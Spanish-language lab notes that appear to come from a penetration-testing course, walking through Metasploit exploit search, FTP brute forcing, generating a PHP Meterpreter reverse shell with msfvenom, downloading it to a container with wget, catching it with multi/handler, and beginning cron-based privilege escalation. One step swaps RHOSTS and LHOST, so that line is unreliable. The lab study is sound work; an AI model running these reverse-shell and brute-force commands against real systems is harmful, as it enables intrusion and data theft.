### Encontrar un exploit que vayamos a usar
- Primero realizaremos un escaneo con **Nmap** independiente o bien con el nmap integrado de **metasploit**. El objetivo es buscar exploits aplicables a los servicios y sus versiones concretas encontrados en la base de datos de **Metasploit**. Esta base de datos se puede consultar aquí: https://www.rapid7.com/db/?type=metasploit. También puedes agregar exploits de **searchsploit** a MSF.
- Para usar nmap de Metasploit: `db_nmap -sV <ip>`
- Una vez tengas los servicios y versiones, busca en la base de datos CVE (http://www.cvedetails.com/) los exploits disponibles para los servicios que encontraste
- Localizar más exploits en: http://www.exploit-db.com/
- Ahora buscamos el exploit en Metasploit con: `search <palabras clave>`
![[Pasted image 20230601115634.png]]
![[Pasted image 20230601120514.png]]

### Ejecución de un exploit
- Una vez que lo hemos encontrado, usaremos el siguiente comando: `use <exploit> - set payload <payload> - show options - set options <...> - exploit`
- Para este caso concreto, necesitaremos configurar los parámetros del exploit:
	- Payload:
		- Consulta los payloads disponibles para un exploit con `show payloads`
		- Como hay muchas opciones disponibles y nosotros queremos una conexión TCP inversa para evitar firewalls, restringimos la búsqueda con: `search payload/linux -t reverse`
		- Una vez aquí debemos elegir el nombre completo del payload a aplicar. Para decidir cuál usar:
			- Tenemos un sistema de destino Linux
			- Vamos a usar una conexión TCP inversa (reverse shell)
			- Necesitamos elegir entre un Meterpreter o un shell estándar (mejor probar Meterpreter)
			- Se trata de una arquitectura x64
			- Luego podemos elegir entre un **Stager** o un payload inline (**stageless**). (en Docker el segundo funciona mejor)
			- Elige el payload que cumpla con estas condiciones con: `set payload <nombre>`![[Pasted image 20230601120455.png]]![[Pasted image 20230601120651.png]]
	- Resto de parámetros:
		- Una vez elegido el payload, consulta la información detallada del exploit con `info <nombre_exploit>` para ver sus opciones y resto de los parámetros
		- **NOTA**: también se puede usar el comando `options` y verlo manualmente ![[Pasted image 20230601120926.png]]
		- Vemos que nos falta por configurar: RHOSTS y LHOST. Los configuramos y ejecutamos el exploit con: `set RHOSTS <IP_ATTACKER>` Y `set LHOST <IP_OBJETIVO>` ![[Pasted image 20230601121150.png]]
- Lamentablemente, parece no ser vulnerable :(
![[Pasted image 20230601121745.png]]

### Uso de módulos auxiliares de MSF
- Vamos a hacer fuerza bruta a un servidor FTP presente en el contenedor de Ubuntu.
- Para ello:
	- El módulo auxiliar se denomina `ftp_login`
	- Lo usamos: `use <nombre>` ![[Pasted image 20230601122121.png]]
	- Da permisos de lectura para todos al archivo `/wordlist/2020mostcommon.txt`
	- Establece las opciones adecuadas para lanzar el exploit ![[Pasted image 20230601122600.png]] ![[Pasted image 20230601122722.png]]

## Payloads con msfvenom y multi/handler

- Para crear un payload personalizado para tratar de explotar una página web vulnerable
- Cheatsheet msfvenom:
![[Untitled.png]]

- El **tool msfvenom** es una aplicación que genera payloads en diferentes lenguajes de programación con diversos efectos maliciosos. Uno de los más típicos es ejecutar un reverse shell de Meterpreter en un sistema infectado
- Vamos a probar esto:
	- Inicia sesión en el contenedor de ubuntu como usuario sin privilegios (**testUser**)
	- El contenedor de escalada de privilegios Ubuntu puede ejecutar páginas web PHP con `php <fichero_php>` y cualquier usuario puede escribir páginas web en el directorio por defecto `/var/www/html`
	- El contenedor Ubuntu está en una IP fija
	- Creamos un payload de Meterpreter reverse shell con PHP (más info en: https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/): `msfvenom -p php/meterpreter_reverse_tcp LHOST=<tu dirección IP> LPORT=<tu puerto> -f raw > shell.php` ![[Pasted image 20230601124144.png]]
	- Ahora, para transferirlo a la máquina objetivo, creamos un servidor de python para leer archivos en un puerto determinado con: `python3 -m http.server <port>` ![[Pasted image 20230601124901.png]]
	- Ahora transferimos el archivo con: `wget http://<ip>:<port>/<file>` ![[Pasted image 20230601130749.png]]
	- Como el payload no se ejecutará dentro de msf, sino en la máquina remota, crea un payload listener `multi/handler` de la siguiente forma (usa un Stageless porque es un contenedor):
````bash
use exploit/multi/handler
set PAYLOAD php/meterpreter_reverse_tcp
set LHOST 172.12.0.2  
set LPORT 4444
````
- Ejecuta el exploit en segundo plano: `exploit -j`
- Ahora ejecutamos el shell.php en la máquina víctima: `php -f shell.php`
- Se nos crea una sesión: ![[Pasted image 20230601131210.png]]
- Para ver las sesiones activas: `sessions -l` ![[Pasted image 20230601131237.png]]
- Para iniciar sesión en una: `sessions -i <ID_SESSION>` ![[Pasted image 20230601131435.png]]
- Ahora ya podemos ejecutar comandos como en un shell normal: ![[Pasted image 20230601131513.png]] ![[Pasted image 20230601131609.png]]

## Escalada de privilegios a través de trabajos cron: Exfiltración de información privada (Scheduled Task/Job)

- Para extraer información privilegiada de un sistema remoto abusando de la funcionalidad cron del SO

	- El daemon `cron` ejecuta tareas programadas para realizar mantenimiento del sistema, copias de seguridad, etc. Las tareas programadas de todo el sistema se pueden consultar en el archivo `/etc/crontab`. Sin embargo, este daemon también se puede usar para hacer escalada de privilegios
	- Vamos a usar esta vulnerabilidad como vector para exfiltrar información privada:
		- Inicia sesión en la máquina objetivo
		- Da permisos o+r a `/tmp/integrity_check.py`
		- Comprueba el contenido del archivo `/etc/crontab` ![[Pasted image 20230601232751.png]] Para interpretar su información visita: https://ostechnix.com/a-beginners-guide-to-cron-jobs/

---